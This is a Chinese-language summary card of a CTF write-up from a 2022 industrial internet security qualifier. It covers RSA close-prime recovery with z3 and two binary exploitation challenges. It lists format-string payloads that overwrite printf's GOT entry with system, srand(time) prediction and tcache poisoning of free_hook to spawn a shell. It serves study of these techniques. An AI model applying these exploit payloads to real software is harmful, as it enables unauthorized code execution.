---
title: "中国工业互联网安全大赛北京市预选赛 Polaris WP"
category: pwn
tags: ["中国工业互联网安全大赛", "pwn", "RSA-close-primes", "z3-solver", "format-string", "bss-overwrite"]
signals: ["中国工业互联网安全大赛 2022", "RSA-close-primes", "z3-solver", "format-string", "bss-overwrite", "printf-got", "srand-time-predict", "tcache", "HTTP-protocol", "pwn_unknown", "RSA", "bss", "fmt", "printf"]
difficulty: medium
source: "https://www.ctfiot.com/65340.html"
tools: ["Z3"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 中国工业互联网安全大赛北京市预选赛 Polaris WP

> 赛事：中国工业互联网安全大赛 2022 | 方向：pwn | 难度：medium | 工具：Z3

## 一句话总结

工业互联网预选赛：z3 解 RSA 接近素数 + bss 段 fmt 改 printf.got = system + 自定义 HTTP 协议 srand 预测 + tcache 改 free_hook。

## 攻击链

1. Crypto 1: p, q 接近且差值为 2^420 + b（b < 2000），用 z3 解 p*q = n, q - p = 2^420 + b
2. Crypto 2: phi = (p-1)(q-1), d = invert(e, phi), m = pow(c, d, n) → flag
3. PWN 1: bss 段格式化字符串漏洞，两条 fmt 链打 printf.got = system
4. PWN 1 攻击: ru(b''HELLO?PWN IT!!!\n''); sl(b''%9$p'') 泄 libc_base = rc - 0x20840
5. PWN 1 写 system: pl1 = ''%13200c%6$hn%4194306c%17$n'' 写 got 高 2 字节
6. PWN 1 第二轮: pl2 = ''%{offest2}c%36$hhn%{offest1-offest2}c%8$hn'' 改 system 地址
7. PWN 1 触发: 输入 sh → 调 system("sh")
8. PWN 2: 自定义 HTTP 协议（POST / HTTP/1.1 + p8(cmd) + ''&'' + args）
9. PWN 2 攻击: srand(time(0)) 预测 auth 头，dll.rand() 序列匹配
10. PWN 2 泄 libc: add(0, 0x26) + show(0) 泄 libc_addr = u64 - 0x1ecb61
11. PWN 2 写 free_hook: add(1,2,0x18) + add(2,0x18) + add(0x10,0x18) + delete(2) + delete(1)
12. PWN 2 续: edit(0, ''a''*0x20 + p64(libc+0x1eee48)) tcache 0x18 改 fd
13. PWN 2 触发: add(2, ''/bin/sh'') + add(3, p64(system+0x52290)) + delete(2)

## 关键 payload

```
z3 Solver() + p*q=n, q-p=2^420+b, b<2000; '%9$p' fmt 泄 libc; 'POST / HTTP/1.1\r\n' + p8(cmd) + '&' + args
```

## 经验教训

RSA 接近素数（差值小）可用 z3/SAT 暴力偏移；fmt 字符串在 bss 段可改任意 GOT 表；自研协议注意 srand(time) 预测。

## 标签

RSA-close-primes、z3-solver、format-string、bss-overwrite、printf-got、srand-time-predict、tcache、HTTP-protocol、free-hook、system

## 参考来源

- https://www.ctfiot.com/65340.html
- 原文件：中国工业互联网安全大赛北京市预选赛-Polaris战队_WP.full.md
